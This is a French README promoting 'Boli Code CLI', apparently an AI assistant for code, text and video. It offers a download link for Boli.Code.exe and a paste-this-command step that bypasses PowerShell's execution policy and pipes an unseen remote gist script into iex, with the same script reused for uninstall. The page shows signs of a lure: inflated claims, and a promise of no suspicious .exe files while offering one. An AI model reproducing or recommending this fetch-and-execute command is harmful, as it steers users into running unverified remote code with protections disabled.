# 🤖 Boli Code CLI — L'Assistant IA Ultime (Code, Texte & Vidéo)

> **Boli Code** est un assistant IA tout-en-un puissant et ultra-léger accessible directement depuis votre terminal Windows (CMD). Générez du code, rédigez du texte et créez du contenu vidéo en quelques secondes, avec ou sans installation préalable ! 🚀

[![Télécharger Boli.Code.exe](https://img.shields.io/badge/Télécharger-Boli.Code.exe-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Adam444195/Boli-Code/releases/download/v.0002/Boli.Code.exe)

---

## 🌟 Pourquoi Boli Code ?

Boli Code a été conçu pour offrir une expérience fluide, rapide et sécurisée sans encombrer votre système.

* 💻 **Assistant Code & Développement :** Écriture, débogage, refactorisation et explication de scripts en temps réel.
* ✍️ **Génération & Rédaction de Texte :** Rédaction de documentation, articles, scripts vidéo et contenus créatifs.
* 🎬 **Création Vidéo par IA :** Génération et manipulation vidéo directement via la ligne de commande.
* ⚡ **Double Mode d'Utilisation :** S'utilise instantanément en mode éphémère ou s'installe en une seule commande.
* 🛡️ **0 Faux Positif :** Fonctionne nativement via Python sans exécutables `.exe` suspects bloqués par Windows Defender.

---

## 🛠️ Prérequis

Avant de démarrer, assurez-vous de disposer de **Python** sur votre système Windows :

* **Python 3.8 ou supérieur** doit être installé.
* Cochez la case **"Add Python to PATH"** lors de l'installation de Python.

---

## 🚀 Utilisation & Lancement

Vous pouvez utiliser Boli Code de différentes manières selon vos besoins :

### Option 1 : Télécharger l'Exécutable (`.exe`) 📦

[![](https://img.shields.io/badge/⬇️_Télécharger_Boli.Code.exe-2ea44f?style=for-the-badge&logo=github)](https://github.com/Adam444195/Boli-Code/releases/download/v.0002/Boli.Code.exe)

---

### Option 2 : Mode Direct / Installation via CMD ⚡

Idéal pour une utilisation rapide ou une installation directe dans CMD. Copiez et collez cette commande dans votre terminal :

```cmd
powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'https://gist.githubusercontent.com/Adam444195/c17e54eecde8f0baaffd01c61661c13e/raw/install.ps1' | iex"
```

##Désinstallé Boll Code
```cmd
powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; & { $(iwr -useb 'https://gist.githubusercontent.com/Adam444195/c17e54eecde8f0baaffd01c61661c13e/raw/install.ps1') } uninstall"
